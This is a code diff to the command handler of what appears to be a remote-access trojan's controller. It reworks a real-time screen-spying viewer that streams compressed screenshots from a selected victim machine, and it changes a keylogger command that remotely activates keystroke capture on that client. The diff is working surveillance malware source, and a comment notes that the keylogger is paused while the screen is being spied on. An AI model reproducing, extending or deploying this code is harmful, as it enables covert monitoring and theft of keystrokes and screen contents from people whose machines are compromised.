@@ -161,8 +161,6 @@ class CommandHandler:
         running = True
 
         def display_screen(screen) -> None:
-            index = 0
-
             while len(data_collection) < 50:
                 logger.info(f'Collection screen Data [{len(data_collection)} / 50]')
                 time_sleep(0.50)
@@ -170,34 +168,41 @@ class CommandHandler:
             while running:
                 try:
 
-                    screen.blit(data_collection[index], (0, 0))
+                    screen.blit(data_collection[0], (0, 0))
                     pygame.display.update()
 
-                    logger.info(f'Displaying screen index: {index} / {len(data_collection)}')
+                    logger.info(f'Displaying screen index: {0} / {len(data_collection)}')
+                    data_collection.pop(0)
+
+                    if (len(data_collection) > 100):
+                        logger.info('Skipping few screen display to reduce delay')
+                        data_collection[:10] = []
+
                     time_sleep(1 / 5)
 
                 except Exception:
                     continue
 
-                index += 1
-
         def receive_screen() -> None:
             nonlocal running
+
+            def convert(dat):
+                img = pygame.transform.scale(pygame.image.load(dat), (screen_width, screen_height))
+                data_collection.append(img)
 
             while running:
                 try:
                     data = selectedClient.socket.receive_packet()
+
+                    if (data.startswith(b'keylogger_response')): # keylogger would be paused during screen spying
+                        continue
+
                     data = BytesIO(decompress(data))
 
-                    Thread(target = lambda x: data_collection.append(
-                        pygame.transform.scale(pygame.image.load(x), (screen_width, screen_height))
-                        ), args = (data,)
-                    ).start()
+                    Thread(target = convert, args = (data,)).start()
 
                 except zlib_error as e:
                     logger.error(f'Failed to fetch screen data: {str(e)}')
-                    selectedClient.socket.send_packet('start_recording')
-                    running = False
 
         pygame.init()
         pygame.display.set_caption(f'{selectedClient.hostname}\'s Real-Time Screen Record')
@@ -215,7 +220,7 @@ class CommandHandler:
                     running = False
 
         selectedClient.stillRecording = False
-        pygame.quit()
+        pygame.quit() # test dulu gak sehh MNATAP
 
     @command(['runpy'], accept_args = True)
     def run_script(self, *fileName) -> None:
@@ -234,11 +239,10 @@ class CommandHandler:
     @command(['keylogger'], accept_args = True)
     def keylogger(self, *args) -> None:
 
-        if not (args[1] in ['on', 'off'] if len(args) == 2 else False):
-            logger.error('Command usage: keylogger [client ID] [on | off]')
+        if not (len(args) == 1):
+            logger.error('Command usage: keylogger [client ID]')
             return
 
-        print("Passed")
         selectedClient: Union['ClientDevice', None] = self.NetServer._selectedClient \
             if self.NetServer._selectedClient else self.bucket.get_client_by_id(args)
 
@@ -246,10 +250,6 @@ class CommandHandler:
             logger.error('Client not found'); return
 
         selectedClient.socket.send_packet('keylogger_activate')
-        response = selectedClient.socket.receive_packet()
+        self.NetServer._waitingForResponse = True
 
-        if (response == '0'):
-            logger.success('Keylogger has been activated, log will be saved on clients/responses/keylogger.log')
-            return
-
-        logger.success('Keylogger sucessfully turned off')
+        while self.NetServer._waitingForResponse: time_sleep(1)
